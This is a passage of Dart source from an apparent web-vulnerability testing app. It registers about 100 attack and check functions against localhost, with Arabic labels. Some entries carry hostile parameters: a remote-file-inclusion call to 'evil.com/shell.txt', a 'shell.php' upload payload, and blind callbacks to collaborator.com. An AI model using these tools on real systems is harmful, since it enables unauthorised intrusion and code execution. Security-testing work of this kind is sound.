        final response = await http.get(Uri.parse('$baseUrl$path'));
        if (response.statusCode == 200) endpoints.add(path);
      } catch (_) {}
    }
    return endpoints;
  }

  /// Tool 100: WebSocket Security Audit
  Future<Map<String, dynamic>> websocketSecurityAudit(String url) async {
    try {
      final channel = WebSocketChannel.connect(Uri.parse(url));
      await channel.ready;
      channel.sink.add('{"type":"auth","token":"test"}');
      channel.sink.close();
      return {'connected': true, 'authenticated': false, 'encrypted': url.startsWith('wss://')};
    } catch (e) {
      return {'connected': false, 'error': e.toString()};
    }
  }

  // ==================== GET ALL TOOLS ====================

  List<Map<String, dynamic>> getAllTools() {
    return [
      _createTool('SQL Injection Basic', 'حقن SQL أساسي', 'SQL Injection', () => sqlInjectionBasic('http://127.0.0.1', 'id')),
      _createTool('SQL Injection Blind', 'حقن SQL أعمى', 'SQL Injection', () => sqlInjectionBlind('http://127.0.0.1', 'id')),
      _createTool('SQL Injection Time-based', 'حقن SQL زمني', 'SQL Injection', () => sqlInjectionTimeBased('http://127.0.0.1', 'id')),
      _createTool('SQL Injection Boolean-based', 'حقن SQL منطقي', 'SQL Injection', () => sqlInjectionBooleanBased('http://127.0.0.1', 'id')),
      _createTool('SQL Injection Error-based', 'حقن SQL عبر الأخطاء', 'SQL Injection', () => sqlInjectionErrorBased('http://127.0.0.1', 'id')),
      _createTool('SQL Injection Union-based', 'حقن SQL Union', 'SQL Injection', () => sqlInjectionUnionBased('http://127.0.0.1', 'id', 5)),
      _createTool('SQL Injection Stacked', 'حقن SQL متعدد', 'SQL Injection', () => sqlInjectionStacked('http://127.0.0.1', 'id')),
      _createTool('SQL Injection OOB', 'حقن SQL خارج النطاق', 'SQL Injection', () => sqlInjectionOob('http://127.0.0.1', 'id', 'collaborator.com')),
      _createTool('SQL Injection Second-order', 'حقن SQL من الدرجة الثانية', 'SQL Injection', () => sqlInjectionSecondOrder('http://127.0.0.1', 'username')),
      _createTool('SQL Injection Cookie-based', 'حقن SQL عبر الكوكيز', 'SQL Injection', () => sqlInjectionCookie('http://127.0.0.1', 'session=test')),
      _createTool('SQL Injection Header-based', 'حقن SQL عبر Headers', 'SQL Injection', () => sqlInjectionHeader('http://127.0.0.1', 'X-Forwarded-For')),
      _createTool('SQL Injection JSON-based', 'حقن SQL عبر JSON', 'SQL Injection', () => sqlInjectionJson('http://127.0.0.1/api')),
      _createTool('SQL Injection XML-based', 'حقن SQL عبر XML', 'SQL Injection', () => sqlInjectionXml('http://127.0.0.1/api')),
      _createTool('XPath Injection', 'حقن XPath', 'SQL Injection', () => xpathInjection('http://127.0.0.1', 'query')),
      _createTool('LDAP Injection', 'حقن LDAP', 'SQL Injection', () => ldapInjection('http://127.0.0.1', 'user')),
      _createTool('NoSQL Injection', 'حقن NoSQL', 'SQL Injection', () => nosqlInjection('http://127.0.0.1/api', 'user')),
      _createTool('MongoDB Injection', 'حقن MongoDB', 'SQL Injection', () => mongodbInjection('http://127.0.0.1/api', 'user')),
      _createTool('CouchDB Injection', 'حقن CouchDB', 'SQL Injection', () => couchdbInjection('http://127.0.0.1:5984')),
      _createTool('Redis Injection', 'حقن Redis', 'SQL Injection', () => redisInjection('http://127.0.0.1', 'key')),
      _createTool('Elasticsearch Injection', 'حقن Elasticsearch', 'SQL Injection', () => elasticsearchInjection('http://127.0.0.1:9200')),
      _createTool('XSS Reflected', 'XSS انعكاسي', 'XSS', () => xssReflected('http://127.0.0.1', 'q')),
      _createTool('XSS Stored', 'XSS مخزن', 'XSS', () => xssStored('http://127.0.0.1', 'comment')),
      _createTool('XSS DOM', 'XSS DOM', 'XSS', () => xssDom('http://127.0.0.1')),
      _createTool('XSS Blind', 'XSS أعمى', 'XSS', () => xssBlind('http://127.0.0.1', 'email', 'https://collaborator.com')),
      _createTool('XSS Mutation', 'XSS تحور', 'XSS', () => xssMutation('http://127.0.0.1', 'input')),
      _createTool('XSS Universal', 'XSS شامل', 'XSS', () => xssUniversal('http://127.0.0.1')),
      _createTool('XSS Self', 'XSS ذاتي', 'XSS', () => xssSelf('http://127.0.0.1')),
      _createTool('XSS Mutation-based', 'XSS قائم على التحور', 'XSS', () => xssMutationBased('http://127.0.0.1', 'q')),
      _createTool('XXE Basic', 'XXE أساسي', 'XXE', () => xxeBasic('http://127.0.0.1')),
      _createTool('XXE Blind', 'XXE أعمى', 'XXE', () => xxeBlind('http://127.0.0.1', 'https://collaborator.com')),
      _createTool('XXE Parameter Entities', 'XXE كيانات معلمة', 'XXE', () => xxeParameterEntities('http://127.0.0.1')),
      _createTool('XXE Doctype', 'XXE Doctype', 'XXE', () => xxeDoctype('http://127.0.0.1')),
      _createTool('XXE Encoding', 'XXE ترميز', 'XXE', () => xxeEncoding('http://127.0.0.1')),
      _createTool('XXE Base64', 'XXE Base64', 'XXE', () => xxeBase64('http://127.0.0.1')),
      _createTool('XXE CDATA', 'XXE CDATA', 'XXE', () => xxeCdata('http://127.0.0.1')),
      _createTool('XXE SOAP', 'XXE SOAP', 'XXE', () => xxeSoap('http://127.0.0.1')),
      _createTool('XXE SVG', 'XXE SVG', 'XXE', () => xxeSvg('http://127.0.0.1')),
      _createTool('XXE DOCX', 'XXE DOCX', 'XXE', () => xxeDocx('http://127.0.0.1')),
      _createTool('XXE XLSX', 'XXE XLSX', 'XXE', () => xxeXlsx('http://127.0.0.1')),
      _createTool('XXE PPTX', 'XXE PPTX', 'XXE', () => xxePptx('http://127.0.0.1')),
      _createTool('LFI', 'تضمين ملف محلي', 'File Inclusion', () => lfi('http://127.0.0.1', 'file')),
      _createTool('RFI', 'تضمين ملف بعيد', 'File Inclusion', () => rfi('http://127.0.0.1', 'file', 'http://evil.com/shell.txt')),
      _createTool('Path Traversal', 'اجتياز المسار', 'File Inclusion', () => pathTraversal('http://127.0.0.1', 'path')),
      _createTool('Directory Listing', 'قائمة المجلدات', 'File Inclusion', () => directoryListing('http://127.0.0.1')),
      _createTool('File Inclusion', 'تضمين ملف', 'File Inclusion', () => fileInclusion('http://127.0.0.1', 'file')),
      _createTool('File Upload Exploit', 'استغلال رفع الملفات', 'File Inclusion', () => fileUploadExploit('http://127.0.0.1/upload', 'file', 'shell.php', [0x3c, 0x3f, 0x70, 0x68, 0x70])),
      _createTool('CSRF Detection', 'كشف CSRF', 'CSRF/SSRF', () => csrfDetect('http://127.0.0.1')),
      _createTool('SSRF Basic', 'SSRF أساسي', 'CSRF/SSRF', () => ssrfBasic('http://127.0.0.1', 'url')),
      _createTool('SSRF Blind', 'SSRF أعمى', 'CSRF/SSRF', () => ssrfBlind('http://127.0.0.1', 'url', 'https://collaborator.com')),
      _createTool('SSRF SMTP', 'SSRF عبر SMTP', 'CSRF/SSRF', () => ssrfSmtp('http://127.0.0.1', 'url')),
      _createTool('SSRF IMAP', 'SSRF عبر IMAP', 'CSRF/SSRF', () => ssrfImap('http://127.0.0.1', 'url')),
      _createTool('SSRF POP3', 'SSRF عبر POP3', 'CSRF/SSRF', () => ssrfPop3('http://127.0.0.1', 'url')),
      _createTool('SSRF Gopher', 'SSRF عبر Gopher', 'CSRF/SSRF', () => ssrfGopher('http://127.0.0.1', 'url')),
      _createTool('SSRF Dict', 'SSRF عبر Dict', 'CSRF/SSRF', () => ssrfDict('http://127.0.0.1', 'url')),
      _createTool('SSRF File', 'SSRF عبر File', 'CSRF/SSRF', () => ssrfFile('http://127.0.0.1', 'url')),
      _createTool('SSRF HTTP', 'SSRF عبر HTTP', 'CSRF/SSRF', () => ssrfHttp('http://127.0.0.1', 'url')),
      _createTool('SSRF HTTPS', 'SSRF عبر HTTPS', 'CSRF/SSRF', () => ssrfHttps('http://127.0.0.1', 'url')),
      _createTool('SSRF FTP', 'SSRF عبر FTP', 'CSRF/SSRF', () => ssrfFtp('http://127.0.0.1', 'url')),
      _createTool('ReDoS Detection', 'كشف ReDoS', 'Regex/Template', () => redosDetect('http://127.0.0.1', 'input')),
      _createTool('Regex Injection', 'حقن Regex', 'Regex/Template', () => regexInjection('http://127.0.0.1', 'pattern')),
      _createTool('Template Injection Detect', 'كشف حقن القوالب', 'Regex/Template', () => templateInjectionDetect('http://127.0.0.1', 'name')),
      _createTool('SSTI', 'حقن القوالب من جانب الخادم', 'Regex/Template', () => ssti('http://127.0.0.1', 'name')),
      _createTool('JSTL Injection', 'حقن JSTL', 'Regex/Template', () => jstlInjection('http://127.0.0.1', 'name')),
      _createTool('Velocity Injection', 'حقن Velocity', 'Regex/Template', () => velocityInjection('http://127.0.0.1', 'name')),
      _createTool('FreeMarker Injection', 'حقن FreeMarker', 'Regex/Template', () => freemarkerInjection('http://127.0.0.1', 'name')),
      _createTool('Thymeleaf Injection', 'حقن Thymeleaf', 'Regex/Template', () => thymeleafInjection('http://127.0.0.1', 'name')),
      _createTool('Jinja2 Injection', 'حقن Jinja2', 'Regex/Template', () => jinja2Injection('http://127.0.0.1', 'name')),
      _createTool('Twig Injection', 'حقن Twig', 'Regex/Template', () => twigInjection('http://127.0.0.1', 'name')),
      _createTool('Smarty Injection', 'حقن Smarty', 'Regex/Template', () => smartyInjection('http://127.0.0.1', 'name')),
      _createTool('Blade Injection', 'حقن Blade', 'Regex/Template', () => bladeInjection('http://127.0.0.1', 'name')),
      _createTool('ERB Injection', 'حقن ERB', 'Regex/Template', () => erbInjection('http://127.0.0.1', 'name')),
      _createTool('HAML Injection', 'حقن HAML', 'Regex/Template', () => hamlInjection('http://127.0.0.1', 'name')),
      _createTool('Slim Injection', 'حقن Slim', 'Regex/Template', () => slimInjection('http://127.0.0.1', 'name')),
      _createTool('EL Injection', 'حقن Expression Language', 'Regex/Template', () => elInjection('http://127.0.0.1', 'name')),
      _createTool('OGNL Injection', 'حقن OGNL', 'Regex/Template', () => ognlInjection('http://127.0.0.1', 'name')),
      _createTool('MVEL Injection', 'حقن MVEL', 'Regex/Template', () => mvelInjection('http://127.0.0.1', 'name')),
      _createTool('SpEL Injection', 'حقن SpEL', 'Regex/Template', () => spelInjection('http://127.0.0.1', 'name')),
      _createTool('JSONP Injection', 'حقن JSONP', 'Misconfiguration', () => jsonpInjection('http://127.0.0.1')),
      _createTool('CORS Misconfiguration', 'سوء تكوين CORS', 'Misconfiguration', () => corsMisconfig('http://127.0.0.1')),
      _createTool('HSTS Missing', 'HSTS مفقود', 'Misconfiguration', () => hstsMissing('https://127.0.0.1')),
      _createTool('CSP Bypass', 'تجاوز CSP', 'Misconfiguration', () => cspBypass('http://127.0.0.1')),
      _createTool('X-Frame-Options Bypass', 'تجاوز XFO', 'Misconfiguration', () => xfoBypass('http://127.0.0.1')),
      _createTool('XSS Protection Bypass', 'تجاوز حماية XSS', 'Misconfiguration', () => xssProtectionBypass('http://127.0.0.1')),
      _createTool('Content-Type Options Missing', 'X-Content-Type-Options مفقود', 'Misconfiguration', () => contentTypeOptionsMissing('http://127.0.0.1')),
      _createTool('Referrer Policy Missing', 'Referrer Policy مفقود', 'Misconfiguration', () => referrerPolicyMissing('http://127.0.0.1')),
      _createTool('Permissions Policy Missing', 'Permissions Policy مفقود', 'Misconfiguration', () => permissionsPolicyMissing('http://127.0.0.1')),
      _createTool('Feature Policy Missing', 'Feature Policy مفقود', 'Misconfiguration', () => featurePolicyMissing('http://127.0.0.1')),
      _createTool('Reporting API Check', 'فحص Reporting API', 'Misconfiguration', () => reportingApiCheck('http://127.0.0.1')),
      _createTool('Network Error Logging', 'تسجيل أخطاء الشبكة', 'Misconfiguration', () => networkErrorLogging('http://127.0.0.1')),
      _createTool('Certificate Transparency', 'شفافية الشهادات', 'Misconfiguration', () => certificateTransparency('https://127.0.0.1')),
      _createTool('Public Key Pinning', 'تثبيت المفتاح العام', 'Misconfiguration', () => publicKeyPinning('https://127.0.0.1')),
      _createTool('Expect-CT Check', 'فحص Expect-CT', 'Misconfiguration', () => expectCtCheck('https://127.0.0.1')),
      _createTool('Security Headers Audit', 'تدقيق Headers الأمان', 'Misconfiguration', () => securityHeadersAudit('https://127.0.0.1')),
      _createTool('Open Redirect Detection', 'كشف إعادة التوجيه المفتوحة', 'Misconfiguration', () => openRedirectDetect('http://127.0.0.1', 'redirect')),
      _createTool('CRLF Injection', 'حقن CRLF', 'Misconfiguration', () => crlfInjection('http://127.0.0.1', 'input')),
      _createTool('HTTP Request Smuggling', 'تهريب طلبات HTTP', 'Misconfiguration', () => httpRequestSmuggling('http://127.0.0.1')),
      _createTool('Web Cache Poisoning', 'تسميم ذاكرة التخزين المؤقت', 'Misconfiguration', () => webCachePoisoning('http://127.0.0.1')),
      _createTool('HTTP Method Override', 'تجاوز طريقة HTTP', 'Misconfiguration', () => httpMethodOverride('http://127.0.0.1')),
      _createTool('API Endpoint Enumeration', 'تعداد نقاط API', 'Misconfiguration', () => apiEndpointEnumeration('http://127.0.0.1')),
      _createTool('WebSocket Security Audit', 'تدقيق أمان WebSocket', 'Misconfiguration', () => websocketSecurityAudit('ws://127.0.0.1:8080')),
    ];
  }
}
